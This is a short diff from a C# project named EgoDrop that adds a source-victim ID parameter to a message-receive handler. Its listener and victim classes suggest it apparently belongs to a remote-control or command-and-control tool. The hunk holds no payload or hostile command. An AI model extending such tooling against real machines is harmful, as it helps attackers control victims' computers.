@@ -21,7 +21,7 @@ namespace EgoDrop
             m_victim = victim;
         }
 
-        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
+        void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
         {
             if (!clsTools.fnbSameVictim(victim, m_victim) || lsMsg.Count == 0)
                 return;
